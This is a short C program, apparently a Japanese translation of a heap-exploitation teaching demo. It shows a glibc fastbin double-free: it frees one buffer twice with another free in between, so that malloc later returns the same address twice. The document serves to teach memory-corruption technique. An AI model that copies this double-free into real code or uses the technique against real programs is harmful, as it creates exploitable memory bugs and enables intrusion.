#include <stdio.h>
#include <stdlib.h>

int main()
{
  printf("単純なfastbinを使ったdouble-free attackのデモ。\n");
  printf("まず、3つのバッファをmallocする。\n\n");

  int *a = malloc(8);
  int *b = malloc(8);
  int *c = malloc(8);

  printf("c: int *a = malloc(8);\n");
  printf("c: int *b = malloc(8);\n");
  printf("c: int *c = malloc(8);\n\n");

  
  printf("1st malloc(8): %p\n", a);
  printf("2nd malloc(8): %p\n", b);
  printf("3rd malloc(8): %p\n\n", c);

  printf("1個目のバッファをfree\n");

  free(a);
  printf("free(a);\n\n");

  
  printf("2個目のバッファ%pをfreeする。\n", b);
  free(b);
  printf("free(b);\n\n");

  printf("そうすると今度は1個目のバッファ%pがfree listの先頭なのでfreeすることが可能になる。\n", a);

  free(a);
  printf("free(a);\n\n");

  printf("現段階のfee listは [ %p, %p, %p ]。となる。もしここでmallocを2回呼ぶと%pが2回返ってくる。\n\n", a, b, a, a);
  printf("1st malloc(8): %p\n", malloc(8));
  printf("2nd malloc(8): %p\n", malloc(8));
  printf("3rd malloc(8): %p\n", malloc(8));
}
